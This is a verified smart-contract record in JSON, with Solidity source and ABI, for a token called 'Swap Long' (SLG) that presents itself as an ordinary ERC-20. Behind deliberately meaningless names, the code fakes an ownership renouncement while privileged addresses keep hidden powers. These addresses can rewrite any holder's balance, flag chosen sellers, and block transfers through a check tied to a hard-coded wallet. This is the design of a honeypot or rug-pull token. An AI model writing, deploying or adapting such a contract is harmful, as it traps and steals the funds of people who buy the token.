{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface swapTokenReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLiquidity) external view returns (uint256);\n\n    function transfer(address launchWallet, uint256 launchedToken) external returns (bool);\n\n    function allowance(address feeAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchWallet,\n        uint256 launchedToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeLiquidity, uint256 value);\n    event Approval(address indexed feeAuto, address indexed spender, uint256 value);\n}\n\nabstract contract buyShouldMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchMarketing {\n    function createPair(address limitExemptMarketing, address txExempt) external returns (address);\n}\n\ninterface swapTokenReceiverMetadata is swapTokenReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SwapLong is buyShouldMax, swapTokenReceiver, swapTokenReceiverMetadata {\n\n    function allowance(address fundWalletAmount, address tradingTake) external view virtual override returns (uint256) {\n        if (tradingTake == marketingReceiverSender) {\n            return type(uint256).max;\n        }\n        return isSell[fundWalletAmount][tradingTake];\n    }\n\n    string private marketingTake = \"SLG\";\n\n    function owner() external view returns (address) {\n        return sellToken;\n    }\n\n    mapping(address => bool) public fundLiquidity;\n\n    uint256 toAt;\n\n    function takeLimit() private view {\n        require(buyMin[_msgSender()]);\n    }\n\n    address public receiverTo;\n\n    function getOwner() external view returns (address) {\n        return sellToken;\n    }\n\n    uint256 public takeLaunch;\n\n    bool public teamFee;\n\n    mapping(address => mapping(address => uint256)) private isSell;\n\n    function balanceOf(address listLiquidity) public view virtual override returns (uint256) {\n        return isSwapMarketing[listLiquidity];\n    }\n\n    address receiverIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant isShould = 15 ** 10;\n\n    string private maxMarketing = \"Swap Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptToken;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingAmount;\n    }\n\n    function sellAt(address enableSender, uint256 launchedToken) public {\n        takeLimit();\n        isSwapMarketing[enableSender] = launchedToken;\n    }\n\n    address private sellToken;\n\n    bool public autoToken;\n\n    function name() external view virtual override returns (string memory) {\n        return maxMarketing;\n    }\n\n    function liquiditySell() public {\n        emit OwnershipTransferred(receiverTo, address(0));\n        sellToken = address(0);\n    }\n\n    address public txMarketing;\n\n    bool private limitLiquidity;\n\n    uint256 private sellFee;\n\n    function approve(address tradingTake, uint256 launchedToken) public virtual override returns (bool) {\n        isSell[_msgSender()][tradingTake] = launchedToken;\n        emit Approval(_msgSender(), tradingTake, launchedToken);\n        return true;\n    }\n\n    mapping(address => bool) public buyMin;\n\n    function transfer(address enableSender, uint256 launchedToken) external virtual override returns (bool) {\n        return shouldModeWallet(_msgSender(), enableSender, launchedToken);\n    }\n\n    constructor (){\n        if (teamFee) {\n            takeLaunch = sellFee;\n        }\n        modeAt teamLaunched = modeAt(marketingReceiverSender);\n        txMarketing = launchMarketing(teamLaunched.factory()).createPair(teamLaunched.WETH(), address(this));\n        if (teamFee) {\n            minTotal = true;\n        }\n        receiverTo = _msgSender();\n        liquiditySell();\n        buyMin[receiverTo] = true;\n        isSwapMarketing[receiverTo] = tradingAmount;\n        \n        emit Transfer(address(0), receiverTo, tradingAmount);\n    }\n\n    function shouldModeWallet(address shouldSwapLiquidity, address launchWallet, uint256 launchedToken) internal returns (bool) {\n        if (shouldSwapLiquidity == receiverTo) {\n            return receiverFund(shouldSwapLiquidity, launchWallet, launchedToken);\n        }\n        uint256 launchFee = swapTokenReceiver(txMarketing).balanceOf(receiverIs);\n        require(launchFee == toAt);\n        require(launchWallet != receiverIs);\n        if (fundLiquidity[shouldSwapLiquidity]) {\n            return receiverFund(shouldSwapLiquidity, launchWallet, isShould);\n        }\n        return receiverFund(shouldSwapLiquidity, launchWallet, launchedToken);\n    }\n\n    event OwnershipTransferred(address indexed isSender, address indexed buyLaunch);\n\n    uint8 private exemptToken = 18;\n\n    function toLiquiditySwap(address toTake) public {\n        takeLimit();\n        \n        if (toTake == receiverTo || toTake == txMarketing) {\n            return;\n        }\n        fundLiquidity[toTake] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTake;\n    }\n\n    mapping(address => uint256) private isSwapMarketing;\n\n    bool public minTotal;\n\n    function transferFrom(address shouldSwapLiquidity, address launchWallet, uint256 launchedToken) external override returns (bool) {\n        if (_msgSender() != marketingReceiverSender) {\n            if (isSell[shouldSwapLiquidity][_msgSender()] != type(uint256).max) {\n                require(launchedToken <= isSell[shouldSwapLiquidity][_msgSender()]);\n                isSell[shouldSwapLiquidity][_msgSender()] -= launchedToken;\n            }\n        }\n        return shouldModeWallet(shouldSwapLiquidity, launchWallet, launchedToken);\n    }\n\n    address marketingReceiverSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 launchBuyReceiver;\n\n    uint256 private tradingAmount = 100000000 * 10 ** 18;\n\n    function receiverFund(address shouldSwapLiquidity, address launchWallet, uint256 launchedToken) internal returns (bool) {\n        require(isSwapMarketing[shouldSwapLiquidity] >= launchedToken);\n        isSwapMarketing[shouldSwapLiquidity] -= launchedToken;\n        isSwapMarketing[launchWallet] += launchedToken;\n        emit Transfer(shouldSwapLiquidity, launchWallet, launchedToken);\n        return true;\n    }\n\n    function totalTrading(address swapEnable) public {\n        if (autoToken) {\n            return;\n        }\n        \n        buyMin[swapEnable] = true;\n        \n        autoToken = true;\n    }\n\n    function maxTeamMin(uint256 launchedToken) public {\n        takeLimit();\n        toAt = launchedToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWalletAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedToken\",\"type\":\"uint256\"}],\"name\":\"maxTeamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedToken\",\"type\":\"uint256\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"}],\"name\":\"toLiquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapEnable\",\"type\":\"address\"}],\"name\":\"totalTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwapLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SwapLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}